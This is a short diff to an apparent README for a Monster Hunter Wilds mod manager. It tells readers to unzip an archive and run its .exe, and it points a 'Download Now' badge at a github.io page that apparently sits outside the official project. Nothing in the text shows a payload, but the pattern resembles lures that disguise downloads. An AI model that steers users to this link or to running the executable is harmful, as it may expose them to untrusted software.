@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file – the mod manager will automatically install mods into the Monster Hunter Wilds "Mods" directory.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://fluffy-mod-manager-monster-hunter-wilds.github.io/.github/)
 
 ## 📸 Overview
 <img width="1920" height="1080" alt="fluffy-mod-manager-dashboard png" src="https://github.com/user-attachments/assets/27d1e3bb-8b02-4df7-85c6-6f514628c86d" />
